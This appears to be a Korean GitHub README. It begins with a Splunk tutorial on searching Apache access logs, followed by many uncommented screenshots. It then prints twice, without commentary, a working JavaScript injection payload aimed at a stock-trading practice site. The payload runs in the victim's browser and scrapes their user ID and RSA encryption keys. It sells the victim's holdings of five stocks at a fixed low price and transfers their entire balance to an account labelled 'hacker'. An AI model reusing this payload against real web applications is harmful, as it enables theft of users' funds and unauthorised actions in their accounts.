<img width="979" alt="스크린샷 2024-07-30 오전 12 55 06" src="https://github.com/user-attachments/assets/4d341099-3c93-4bf5-ba4b-0e3b7f7cd81f"># Data_splunk
log데이터를 splunk로 분석해 보기

## 데이터 업로드
- 설정 > 데이터 추가 > 업로드 > 파일 선택
- [아파치 로그파일]로그파일 추가
> ![image](https://github.com/hanmin0512/Data_splunk/assets/37041208/3e2ca7a4-7e12-4624-b0e4-24dabef13f3c)
- 다음
- Source type : access_combined으로 설정 되었는지 확인
> ![image](https://github.com/hanmin0512/Data_splunk/assets/37041208/f870375a-5512-471e-a174-edadf203db9d)
- 다음 > 새 인덱스 만들기
> ![image](https://github.com/hanmin0512/Data_splunk/assets/37041208/4f38dfd4-5023-4e14-aef8-d54a3ae365a2)
- 검토 > 제출 > 검색 시작

## 데이터 가공
- uri 필드의 데이터의 끝 부분을 가져와 file_1필드를 만들어보기.
- 아래 명령어는 git_apache 인덱스에서 uri필드의 .../(~) 이부분중 괄호로 감싼 부분을 가져와 file_1필드에 값을 넣겠다 라는 뜻이다.
```
index="git_apache" 
| eval file_1=replace(uri,".*\/(.)","\1")
```
> ![image](https://github.com/hanmin0512/Data_splunk/assets/37041208/829522f2-783a-4a55-99b8-3e614e384e3f)

> ![image](https://github.com/hanmin0512/Data_splunk/assets/37041208/e0b84bd7-0182-48b5-a4c4-97a9fd4442fe)

## 기간 별 status 필드 값 400 발생량 확인하기.
```
index="git_apache" status=400
| timechart count by status
```
> ![image](https://github.com/hanmin0512/Data_splunk/assets/37041208/7771d663-46ff-440d-96ce-94c81299352f)

## 기간별 특정ip 로그 발생 수 확인하기
```
index="git_apache"  clientip="128.30.28.58"
| timechart count by clientip
```
> ![image](https://github.com/hanmin0512/Data_splunk/assets/37041208/5bfb418e-cbf4-4252-8c35-5b9fdc2198b9)





===========
===========

<img width="660" alt="스크린샷 2024-07-28 오후 2 28 04" src="https://github.com/user-attachments/assets/14bf6a6d-f015-4129-85cf-4889f8b0a1be">
<img width="1115" alt="스크린샷 2024-07-28 오후 2 28 43" src="https://github.com/user-attachments/assets/592694f7-81fd-4430-8e54-7e986e8c2b62">
<img width="1472" alt="스크린샷 2024-07-28 오후 2 29 15" src="https://github.com/user-attachments/assets/5e13dbd2-b59b-4b25-b93d-65a98a638eff">




<img width="434" alt="스크린샷 2024-07-28 오후 8 01 24" src="https://github.com/user-attachments/assets/3853128d-95a7-41e9-84e4-38ee974c4cff">

<img width="1285" alt="스크린샷 2024-07-28 오후 8 01 39" src="https://github.com/user-attachments/assets/86b00cd4-2309-41a4-9a4b-888843101cc3">

<img width="1404" alt="스크린샷 2024-07-28 오후 8 02 49" src="https://github.com/user-attachments/assets/0370111b-9c58-40d0-8627-100538388dcf">

<img width="638" alt="스크린샷 2024-07-28 오후 8 03 14" src="https://github.com/user-attachments/assets/55690f35-2cb0-4815-acf3-4f04f207f8a5">

<img width="987" alt="스크린샷 2024-07-28 오후 8 04 42" src="https://github.com/user-attachments/assets/ed8fb5d1-7935-439b-a077-9baa55627402">


=========
<img width="734" alt="스크린샷 2024-07-28 오후 11 10 37" src="https://github.com/user-attachments/assets/3b2c375f-e280-49a1-8325-f4e50d5fb44f">

<img width="732" alt="스크린샷 2024-07-28 오후 11 11 48" src="https://github.com/user-attachments/assets/b9c38c62-e21e-4109-9df2-0e724db6e1a0">

<img width="856" alt="스크린샷 2024-07-28 오후 11 14 11" src="https://github.com/user-attachments/assets/205eb5d7-9c37-41fb-ae34-59174f33f7cb">

<img width="635" alt="스크린샷 2024-07-28 오후 11 17 36" src="https://github.com/user-attachments/assets/e1ceaa05-2a9b-4778-9fc0-98a3e44e7a5a">

<img width="1174" alt="스크린샷 2024-07-28 오후 11 19 01" src="https://github.com/user-attachments/assets/d4ddc035-cb4d-45e5-91d3-00f81cec4497">


<img width="446" alt="스크린샷 2024-07-28 오후 11 19 09" src="https://github.com/user-attachments/assets/e3351f94-f316-4a42-b114-882752bbe3c1">

<img width="469" alt="스크린샷 2024-07-28 오후 11 19 36" src="https://github.com/user-attachments/assets/b0040aeb-4809-4595-9221-5d5fa86a5ade">

<img width="724" alt="스크린샷 2024-07-28 오후 11 20 36" src="https://github.com/user-attachments/assets/a9b1db7f-a715-4d08-b187-39fbd6deb1fe">

<img width="481" alt="스크린샷 2024-07-28 오후 11 21 52" src="https://github.com/user-attachments/assets/31c24d6c-cb16-4d6b-ab0f-e376a0818495">

<img width="569" alt="스크린샷 2024-07-28 오후 11 26 23" src="https://github.com/user-attachments/assets/10fcdc76-775f-4165-ac20-ebf21580b9a3">

<img width="622" alt="스크린샷 2024-07-28 오후 11 27 58" src="https://github.com/user-attachments/assets/ea27f19e-d081-4eeb-a8c8-cd82ee6cdf71">

<img width="429" alt="스크린샷 2024-07-28 오후 11 28 19" src="https://github.com/user-attachments/assets/af9e0c97-ad2a-4269-bf75-c2449e898cf3">

<img width="498" alt="스크린샷 2024-07-28 오후 11 28 30" src="https://github.com/user-attachments/assets/c47fb592-fd67-4c1f-b66d-32fc28e8a5d1">

<img width="922" alt="스크린샷 2024-07-28 오후 11 29 16" src="https://github.com/user-attachments/assets/96812bca-cc3a-487c-a864-fd81e20016ba">

===
```
<script src="/js/jquery.min.js"></script>
<script src="/js/rsa/jsbn.js"></script>
<script src="/js/rsa/prng4.js"></script>
<script src="/js/rsa/rng.js"></script>
<script src="/js/rsa/rsa.js"></script>

<script>
    async function getStock() {
        const stockCode_list = ['AAPL', 'AMZN', 'FB', 'GOOGL', 'MSFT'];
        const stockName_list = ['Apple', 'Amazon.com', 'Meta', 'Alphabet', 'Microsoft'];

        for (let i = 0; i < stockCode_list.length; i++) {
            const stockCode = stockCode_list[i];
            const stockName = stockName_list[i];
            try {
                const response = await fetch(`https://rookiestocks.run.goorm.io/detailstock?stockCode=${stockCode}&stockName=${stockName}`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'text/plain'
                    }
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                const html = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, "text/html");
                const userIdInput = doc.querySelector("#USER_ID");
                const modulusMatch = html.match(/id="RSAModulus"\s+value="([^"]+)"/);
                const Exponent = html.match(/id="RSAExponent"\s+value="([^"]+)"/);
                const match = html.match(/own\.innerHTML \+= "[^`]*`(\d+)`/);
                let haveUnit = "";
                if (match) {
                    haveUnit = match[1]; // 첫 번째 캡쳐 그룹의 값을 가져옵니다.
                    console.log('보유 주식 수:', haveUnit);
                } else {
                    console.log('매치되는 데이터가 없습니다.');
                }
                if (userIdInput && modulusMatch && Exponent) {
                    const RSAModulus = modulusMatch[1];
                    const RSAExponent = Exponent[1];
                    const userIdValue = userIdInput.value;
                    console.log('Extracted RSAModulus:', RSAModulus);
                    console.log('Extracted RSAExponent:', RSAExponent);
                    console.log('Extracted USER_ID:', userIdValue);
                    await performAjaxSell(RSAModulus, RSAExponent, userIdValue, stockCode, haveUnit);
                } else {
                    console.log('USER_ID input not found in the data.');
                }
            } catch (error) {
                console.error('Fetch error:', error);
            }
        }
    }

    async function sendMoney() {
        try {
            const response = await fetch('https://rookiestocks.run.goorm.io/mypage', {
                method: 'GET',
                headers: {
                    'Accept': 'text/plain'
                }
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            const res = await response.text();
            const balanceRegex = /"ACCOUNT_BALANCE":(\d+)/;
            const match = res.match(balanceRegex);

            if (match) {
                var bal = match[1]; // 잔액 조정
                console.log("ACCOUNT_BALANCE value:", bal);

                const transfer_res = await fetch('https://rookiestocks.run.goorm.io/mypage/transfer', {
                    method: 'GET',
                    headers: {
                        'Accept': 'text/plain'
                    }
                });

                if (!transfer_res.ok) {
                    throw new Error('Network response was not ok');
                }

                const tranfer_text = await transfer_res.text();
                const userIdInput = 'hacker'; 
                const modulusMatch = tranfer_text.match(/id="RSAModulus"\s+value="([^"]+)"/);
                const Exponent = tranfer_text.match(/id="RSAExponent"\s+value="([^"]+)"/);

                if (userIdInput && modulusMatch && Exponent) {
                    const RSAModulus = modulusMatch[1];
                    const RSAExponent = Exponent[1]; 
                    await ajaxSend(RSAModulus, RSAExponent, userIdInput, bal);
                } else {
                    console.log("Required data not found in transfer response.");
                }
            } else {
                console.log("ACCOUNT_BALANCE not found.");
            }
        } catch (error) {
            console.error('Fetch error:', error);
        }
    }

    async function main() {
        await getStock();
        await sendMoney();
    }

    main();

    async function performAjaxSell(RSAModulus, RSAExponent, UserId, stock, haveUnit) {
    var PRICE = '100';
    var UNIT = haveUnit;
    var USERID = UserId;
    var STOCK = stock;

    const rsa = new RSAKey();
    rsa.setPublic(RSAModulus, RSAExponent);
    let data = {
        stock: STOCK,
        price: PRICE,
        userId: USERID,
        unit: UNIT
    };
    let e2eData = rsa.encrypt(JSON.stringify(data));

    // Promise를 반환하는 jQuery Ajax 사용
    try {
        const response = await $.ajax({
            url: '/detailSell',
            type: 'POST',
            contentType: 'application/json',
            data: e2eData
        });
        alert(response.MSG);
    } catch (error) {
        alert('오류 발생: ' + error.statusText);
    }
}

async function ajaxSend(RSAModulus, RSAExponent, user_nm, PRICE) {
    const rsa = new RSAKey();
    rsa.setPublic(RSAModulus, RSAExponent);
    let data = {
        name: user_nm,
        account_number: '909089-4923112',
        price: PRICE,
        transfer_bankagency: 'RK루키은행'
    };
    let e2eData = rsa.encrypt(JSON.stringify(data));

    // Promise를 반환하는 jQuery Ajax 사용
    try {
        const response = await $.ajax({
            url: '/mypage/send',
            type: 'POST',
            contentType: 'application/json',
            data: e2eData
        });
        alert(response.body);
    } catch (error) {
        alert('오류 발생: ' + error.statusText);
    }
}

</script>
```

======

```
<script src="/js/jquery.min.js"></script>
<script src="/js/rsa/jsbn.js"></script>
<script src="/js/rsa/prng4.js"></script>
<script src="/js/rsa/rng.js"></script>
<script src="/js/rsa/rsa.js"></script>

<script>
    async function getStock() {
        const stockCode_list = ['AAPL', 'AMZN', 'FB', 'GOOGL', 'MSFT'];
        const stockName_list = ['Apple', 'Amazon.com', 'Meta', 'Alphabet', 'Microsoft'];

        for (let i = 0; i < stockCode_list.length; i++) {
            const stockCode = stockCode_list[i];
            const stockName = stockName_list[i];
            try {
                const response = await fetch(`https://rookiestocks.run.goorm.io/detailstock?stockCode=${stockCode}&stockName=${stockName}`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'text/plain'
                    }
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                const html = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, "text/html");
                const userIdInput = doc.querySelector("#USER_ID");
                const modulusMatch = html.match(/id="RSAModulus"\s+value="([^"]+)"/);
                const Exponent = html.match(/id="RSAExponent"\s+value="([^"]+)"/);
                const match = html.match(/own\.innerHTML \+= "[^`]*`(\d+)`/);
                let haveUnit = "";
                if (match) {
                    haveUnit = match[1]; // 첫 번째 캡쳐 그룹의 값을 가져옵니다.
                    console.log('보유 주식 수:', haveUnit);
                } else {
                    console.log('매치되는 데이터가 없습니다.');
                }
                if (userIdInput && modulusMatch && Exponent) {
                    const RSAModulus = modulusMatch[1];
                    const RSAExponent = Exponent[1];
                    const userIdValue = userIdInput.value;
                    console.log('Extracted RSAModulus:', RSAModulus);
                    console.log('Extracted RSAExponent:', RSAExponent);
                    console.log('Extracted USER_ID:', userIdValue);
                    await performAjaxSell(RSAModulus, RSAExponent, userIdValue, stockCode, haveUnit);
                } else {
                    console.log('USER_ID input not found in the data.');
                }
            } catch (error) {
                console.error('Fetch error:', error);
            }
        }
    }

    async function sendMoney() {
        try {
            const response = await fetch('https://rookiestocks.run.goorm.io/mypage', {
                method: 'GET',
                headers: {
                    'Accept': 'text/plain'
                }
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            const res = await response.text();
            const balanceRegex = /"ACCOUNT_BALANCE":(\d+)/;
            const match = res.match(balanceRegex);

            if (match) {
                var bal = match[1]; // 잔액 조정
                console.log("ACCOUNT_BALANCE value:", bal);

                const transfer_res = await fetch('https://rookiestocks.run.goorm.io/mypage/transfer', {
                    method: 'GET',
                    headers: {
                        'Accept': 'text/plain'
                    }
                });

                if (!transfer_res.ok) {
                    throw new Error('Network response was not ok');
                }

                const tranfer_text = await transfer_res.text();
                const userIdInput = 'hacker'; 
                const modulusMatch = tranfer_text.match(/id="RSAModulus"\s+value="([^"]+)"/);
                const Exponent = tranfer_text.match(/id="RSAExponent"\s+value="([^"]+)"/);

                if (userIdInput && modulusMatch && Exponent) {
                    const RSAModulus = modulusMatch[1];
                    const RSAExponent = Exponent[1]; 
                    await ajaxSend(RSAModulus, RSAExponent, userIdInput, bal);
                } else {
                    console.log("Required data not found in transfer response.");
                }
            } else {
                console.log("ACCOUNT_BALANCE not found.");
            }
        } catch (error) {
            console.error('Fetch error:', error);
        }
    }

    async function main() {
        await getStock();
        await sendMoney();
    }

    main();

    async function performAjaxSell(RSAModulus, RSAExponent, UserId, stock, haveUnit) {
    var PRICE = '100';
    var UNIT = haveUnit;
    var USERID = UserId;
    var STOCK = stock;

    const rsa = new RSAKey();
    rsa.setPublic(RSAModulus, RSAExponent);
    let data = {
        stock: STOCK,
        price: PRICE,
        userId: USERID,
        unit: UNIT
    };
    let e2eData = rsa.encrypt(JSON.stringify(data));

    // Promise를 반환하는 jQuery Ajax 사용
    try {
        const response = await $.ajax({
            url: '/detailSell',
            type: 'POST',
            contentType: 'application/json',
            data: e2eData
        });
        alert(response.MSG);
    } catch (error) {
        alert('오류 발생: ' + error.statusText);
    }
}

async function ajaxSend(RSAModulus, RSAExponent, user_nm, PRICE) {
    const rsa = new RSAKey();
    rsa.setPublic(RSAModulus, RSAExponent);
    let data = {
        name: user_nm,
        account_number: '909089-4923112',
        price: PRICE,
        transfer_bankagency: 'RK루키은행'
    };
    let e2eData = rsa.encrypt(JSON.stringify(data));

    // Promise를 반환하는 jQuery Ajax 사용
    try {
        const response = await $.ajax({
            url: '/mypage/send',
            type: 'POST',
            contentType: 'application/json',
            data: e2eData
        });
        alert(response.body);
    } catch (error) {
        alert('오류 발생: ' + error.statusText);
    }
}

</script>
```

====


<img width="903" alt="스크린샷 2024-07-30 오전 1 28 04" src="https://github.com/user-attachments/assets/0d1adf10-44a5-460f-988b-9833834c354c">

<img width="1176" alt="스크린샷 2024-07-30 오전 1 20 35" src="https://github.com/user-attachments/assets/00c38338-c973-492c-b5ae-86e8b46945ce">


<img width="594" alt="스크린샷 2024-07-30 오전 1 20 47" src="https://github.com/user-attachments/assets/cefd1ba9-f9a4-48ed-996c-8fc67cba9b7e">


<img width="477" alt="스크린샷 2024-07-30 오전 1 22 25" src="https://github.com/user-attachments/assets/a2e4ac76-1c6b-418c-af8b-09d2270fd19b">

<img width="274" alt="스크린샷 2024-07-30 오전 1 22 35" src="https://github.com/user-attachments/assets/4c9e2f8f-ca6c-4098-862c-688120712acd">

<img width="255" alt="스크린샷 2024-07-30 오전 1 23 02" src="https://github.com/user-attachments/assets/11bc7b34-6ede-42e8-b62a-f3f1e9df905c">

<img width="742" alt="스크린샷 2024-07-30 오전 1 23 08" src="https://github.com/user-attachments/assets/44abfe72-f04b-41d1-ab9f-118c1d418b33">




































